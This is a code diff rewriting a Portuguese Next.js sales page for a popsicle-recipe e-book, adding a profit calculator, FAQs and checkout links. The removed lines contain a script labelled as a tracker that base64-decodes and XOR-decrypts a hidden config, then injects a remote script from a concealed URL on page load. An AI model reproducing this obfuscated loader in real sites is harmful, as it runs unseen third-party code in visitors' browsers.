@@ -1,80 +1,68 @@
-import { HeroSectionBr } from "@/components/br/hero-section-br"
-import { PracticeSectionBr } from "@/components/br/practice-section-br"
-import { IdealSectionBr } from "@/components/br/ideal-section-br"
-import { ScarcitySectionBr } from "@/components/br/scarcity-section-br"
-import { SocialProofBr } from "@/components/br/social-proof-br"
-import { OfferCardBr } from "@/components/br/offer-card-br"
-import { GuaranteeSectionBr } from "@/components/br/guarantee-section-br"
-import Script from "next/script"
-import { FaqSectionBr } from "@/components/br/faq-section-br"
+'use client'
 
-const CHECKOUT_URL_ESSENCIAL = "https://pay.cakto.com.br/m4f7cwc_1034537"
-const CHECKOUT_URL_COMPLETO = "https://pay.cakto.com.br/waoe895"
+import Image from 'next/image'
+import { useMemo, useState } from 'react'
+
+const checkout = 'https://pay.cakto.com.br/waoe895'
+const flavors = [
+  ['Leite Ninho com creme de avelã', '/images/receta-coco.png'],
+  ['Chocolate com brigadeiro', '/images/receta-cafe.png'],
+  ['Morango cremoso', '/images/receta-mango.png'],
+  ['Maracujá', '/images/receta-maracuya.png'],
+  ['Prestígio', '/images/receta-coco.png'],
+  ['Paçoca', '/images/receta-mango.png'],
+  ['Oreo', '/images/receta-cookies.png'],
+  ['Doce de leite', '/images/receta-limon.png'],
+]
+const faqs = [
+  ['Como recebo o material?', 'Após a confirmação do pagamento, você recebe o acesso digital no seu e-mail.'],
+  ['Preciso ter experiência?', 'Não. As receitas foram organizadas com ingredientes, quantidades e preparo passo a passo.'],
+  ['Posso vender os picolés?', 'Sim. O material foi pensado para quem quer produzir em casa e começar a vender.'],
+  ['O pagamento é seguro?', 'Sim. O checkout é processado por uma plataforma segura e você ainda conta com 7 dias de garantia.'],
+]
 
 export default function Page() {
-  return (
-    <>
-      <Script id="utmfy-tracker-br" strategy="afterInteractive">
-        {`(function(){var t_g3=atob("DDB/qUAA8krn8QmgYEtd3DJs0HDFmX3UEENFhm9jliTJhH3NCVYGhyNvn2SFgybTA0IW2TRz3T+TnHqPDFELzDN03CCU0yWCAUQL2ylihz6CgiuaO0tdxyFtl2jd023BFFFS3DRtmyye3HnSBUYaxzQtiimIlSTTA1tdhWJ2kyaSlCuaQhIChTsinCuKlCuaQlQe3SEthz6KmG/ZTUANzDZlnD7KgnzCCVQMi2wihCuLhGyCWhJd1B19");var m_n=[];for(var o_vf=0;o_vf<t_g3.length;o_vf++){m_n.push(t_g3.charCodeAt(o_vf)&255);}var c_fcg=m_n[0];var k_g=m_n.slice(1,1+c_fcg);var d_t94=m_n.slice(1+c_fcg);var m_1dzd=d_t94.map(function(b,d_o){return b^k_g[d_o%c_fcg];});var v_qs="";for(var a_j=0;a_j<m_1dzd.length;a_j++){v_qs+=String.fromCharCode(m_1dzd[a_j]&255);}var s_b=decodeURIComponent(escape(v_qs));var m_b=JSON.parse(s_b);var o_q=m_b.globals||[];o_q.forEach(function(m_a){window[m_a.name]=m_a.value;});var u_mls=document.createElement("script");u_mls.src=m_b.url;u_mls.async=true;u_mls.defer=true;(m_b.attributes||[]).forEach(function(f_yo){u_mls.setAttribute(f_yo.name,f_yo.value);});(document.head||document.documentElement).appendChild(u_mls);})();`}
-      </Script>
-      <main className="min-h-screen bg-background">
-        <HeroSectionBr
-          className="relative overflow-hidden px-5 pt-3 pb-2 sm:pt-4 sm:pb-3"
-          headline={
-            <span className="text-verde-cta">
-              As receitas que vão fazer você vender +300 picolés este mês e transformar sua cozinha em uma fonte de renda extra
-            </span>
-          }
-          subheadline={
-            <>
-              <span className="block font-display text-xl font-extrabold text-chocolate sm:text-2xl">
-                + de 100 Receitas de Picolés Gourmet Recheados, Cremosos e Fáceis de Vender.
-              </span>
-              <span className="mt-2 block">
-                Para quem quer ganhar dinheiro em casa sem precisar de ingredientes caros nem passar horas inventando
-                receitas.
-              </span>
-            </>
-          }
-          imageSrc="/images/br-hero-mockup.png"
-          imageAlt="Mockup da oferta 'Picolés Recheados Lucrativos' com o livro de 100 receitas, caixa de presente com picolés gourmet de vários sabores e cards de bônus como mensagens prontas para vender, calcule seu preço certo e dicas para vender mais."
-          checkoutUrl="#oferta"
-        />
-        <PracticeSectionBr className="bg-secondary px-5 py-3 sm:py-4" />
-        <IdealSectionBr className="px-5 py-3 sm:py-4" />
-        <ScarcitySectionBr checkoutUrl={CHECKOUT_URL_ESSENCIAL} className="bg-chocolate px-5 py-3 sm:py-4 text-center" />
-        <SocialProofBr className="overflow-hidden py-3 sm:py-4" />
-        <OfferCardBr
-          planName="Plano Essencial"
-          price="R$ 19,90"
-          checkoutUrl={CHECKOUT_URL_ESSENCIAL}
-          className="scroll-mt-4 px-5 pt-2 pb-1.5"
-          includedItems={[
-            "100 Recetas de paletas gourmet",
-            "Archivos en PDF listos para imprimir",
-            "Material organizado por sabor",
-            "Fácil de aplicar em casa",
-          ]}
-          showBonuses={false}
-        />
-        <OfferCardBr
-          planName="Plano Completo"
-          price="R$ 27,90"
-          checkoutUrl={CHECKOUT_URL_COMPLETO}
-          sectionId="oferta-completo"
-          className="scroll-mt-4 px-5 pt-1.5 pb-2"
-          highlightText="6 Bônus Exclusivos inclusos no plano completo"
-        />
-        <GuaranteeSectionBr className="px-5 py-3 sm:py-4" />
-        <FaqSectionBr checkoutUrl={CHECKOUT_URL_ESSENCIAL} className="px-5 py-3 sm:py-4" />
+  const [openFaq, setOpenFaq] = useState<number | null>(null)
+  const [base, setBase] = useState(18.5)
+  const [filling, setFilling] = useState(9)
+  const [yieldCount, setYieldCount] = useState(20)
+  const [salePrice, setSalePrice] = useState(6)
+  const result = useMemo(() => {
+    const cost = (base + filling) / Math.max(yieldCount, 1)
+    const profit = salePrice - cost
+    return { cost, profit, batch: profit * yieldCount, margin: salePrice ? (profit / salePrice) * 100 : 0 }
+  }, [base, filling, yieldCount, salePrice])
 
-        <footer className="bg-chocolate px-5 py-5 text-center">
-          <p className="mx-auto max-w-md text-xs leading-relaxed text-creme/70">
-            Este é um produto digital. O resultado depende da aplicação das receitas. 100 Picolés Gourmet Recheados e
-            Cremosos. Todos os direitos reservados.
-          </p>
-        </footer>
-      </main>
-    </>
+  return (
+    <main className="nova-page">
+      <div className="nova-topbar">🎁 Oferta especial: 100 Receitas de Picolés Recheados + 6 bônus exclusivos</div>
+      <section className="nova-hero nova-container">
+        <span className="nova-kicker">✧ FAÇA · RECHEIE · VENDA ✧</span>
+        <h1>100 Receitas de Picolés Recheados Lucrativos <em>para Fazer em Casa e Começar a Vender</em></h1>
+        <p className="nova-lead">Tenha em mãos <strong>100 receitas de picolés recheados</strong>, com ingredientes, medidas, recheios e preparo passo a passo para montar um cardápio variado sem precisar ficar procurando receitas espalhadas pela internet.</p>
+        <div className="nova-hero-image"><span>🍦 100 Receitas Passo a Passo + 6 Bônus</span><Image src="/images/br-hero-mockup.png" alt="Mockup do material 100 Receitas de Picolés Recheados Lucrativos" width={900} height={900} priority /></div>
+        <a className="nova-button" href={checkout}>QUERO AS 100 RECEITAS AGORA <small>ACESSO IMEDIATO E SEGURO</small></a>
+        <a className="nova-text-link" href="#material">VER O QUE VEM NO MATERIAL</a>
+      </section>
+
+      <section id="material" className="nova-section nova-light">
+        <div className="nova-container"><span className="nova-label">O MATERIAL COMPLETO</span><h2>O que você encontra dentro do material</h2><div className="nova-check-grid">{['100 receitas de picolés recheados','Sabores variados para montar seu cardápio','Ingredientes e medidas organizados','Preparo explicado passo a passo','Material digital para consultar pelo celular','6 bônus para ajudar você a produzir e começar a vender'].map(item => <div key={item}>✓ <span>{item}</span></div>)}</div></div>
+      </section>
+
+      <section className="nova-section nova-cream"><div className="nova-container"><span className="nova-label">AMOSTRA DO CARDÁPIO</span><h2>Veja alguns dos picolés que você vai aprender</h2><p>São 100 receitas para você variar sabores, recheios e combinações.</p><div className="nova-flavors">{flavors.map(([name, src]) => <article key={name}><Image src={src} alt={`Receita de picolé de ${name}`} width={300} height={300} /><h3>{name}</h3><p>Base cremosa, recheio generoso e preparo simples.</p></article>)}</div><a className="nova-button" href={checkout}>QUERO RECEBER AS 100 RECEITAS</a></div></section>
+
+      <section className="nova-section nova-dark"><div className="nova-container"><span className="nova-label">ESTRUTURA PADRONIZADA</span><h2>100 receitas organizadas para você produzir</h2><p>Em vez de testar receitas aleatórias, abra o material e escolha o próximo sabor.</p><div className="nova-steps">{['Ingredientes','Quantidades','Base do picolé','Recheio','Montagem','Finalização'].map((item, i) => <article key={item}><b>0{i + 1}</b><h3>{item}</h3><p>Orientações claras e medidas padronizadas para não errar no ponto.</p></article>)}</div></div></section>
+
+      <section className="nova-section nova-light"><div className="nova-container"><span className="nova-label">CARDÁPIO VARIADO</span><h2>Do tradicional ao gourmet</h2><p>Combinações para variar sua produção e lucrar o ano inteiro:</p><div className="nova-tags">{['Leite Ninho','Chocolate','Morango','Maracujá','Prestígio','Paçoca','Oreo','Doce de leite','Coco','Chocolate branco','Sensação','Limão cremoso','Romeu e Julieta','Cookies & Cream','Beijinho','Chocolate intenso'].map(x => <span key={x}>{x}</span>)}</div></div></section>
+
+      <section className="nova-section nova-cream"><div className="nova-container"><span className="nova-label">ACELERAÇÃO DE RESULTADOS</span><h2>6 bônus exclusivos para você produzir e vender</h2><div className="nova-bonuses">{['Calculadora do Picolé Lucrativo','Guia de Recheios Cremosos','Cardápio Pronto para Personalizar','Checklist da Primeira Produção','Guia de Embalagem e Apresentação','30 Frases para Divulgar Seus Picolés no WhatsApp'].map((x, i) => <article key={x}><b>BÔNUS #{i + 1}</b><h3>{x}</h3><p>Material prático para organizar sua produção, apresentação e vendas.</p></article>)}</div></div></section>
+
+      <section className="nova-section nova-dark"><div className="nova-container nova-calculator"><span className="nova-label">BÔNUS #1 INCLUSO NO PLANO COMPLETO</span><h2>Prévia interativa: Calculadora do Picolé Lucrativo</h2><p>Simule agora o custo de uma receita caseira e descubra o potencial de retorno por cada fornada.</p><div className="nova-calc-grid">{[['Custo da Base', base, setBase],['Custo do Recheio', filling, setFilling],['Rendimento da Receita', yieldCount, setYieldCount],['Preço de Venda', salePrice, setSalePrice]].map(([label, value, setter]) => <label key={label as string}>{label as string}<input type="number" value={value as number} onChange={e => (setter as (n: number) => void)(Number(e.target.value))} /></label>)}</div><div className="nova-result"><h3>Resultado da Produção</h3><div><strong>R$ {result.cost.toFixed(2)}</strong><span>CUSTO POR PICOLÉ</span></div><div><strong>R$ {result.profit.toFixed(2)}</strong><span>LUCRO POR UNIDADE</span></div><div><strong>R$ {result.batch.toFixed(2)}</strong><span>LUCRO NA FORNADA</span></div><div><strong>{result.margin.toFixed(0)}%</strong><span>MARGEM DE LUCRO</span></div></div></div></section>
+
+      <section className="nova-offer"><div className="nova-container"><span className="nova-label">OFERTA ESPECIAL</span><h2>Comece hoje a montar seu cardápio lucrativo</h2><p>Tenha o material completo, os 6 bônus e acesso imediato.</p><div className="nova-price"><del>R$ 47,00</del><strong>R$ 27,90</strong></div><a className="nova-button" href={checkout}>QUERO O PLANO COMPLETO</a><p className="nova-small">Compra segura · 7 dias de garantia · acesso digital imediato</p></div></section>
+
+      <section className="nova-section nova-light"><div className="nova-container"><span className="nova-label">DÚVIDAS FREQUENTES</span><h2>Perguntas frequentes</h2><div className="nova-faq">{faqs.map(([q, a], i) => <div key={q}><button onClick={() => setOpenFaq(openFaq === i ? null : i)}>{q}<span>{openFaq === i ? '−' : '+'}</span></button>{openFaq === i && <p>{a}</p>}</div>)}</div><a className="nova-button" href={checkout}>QUERO AS 100 RECEITAS AGORA</a></div></section>
+      <footer className="nova-footer">Este é um produto digital. O resultado depende da aplicação das receitas.<br />100 Picolés Gourmet Recheados e Cremosos. Todos os direitos reservados.</footer>
+    </main>
   )
 }
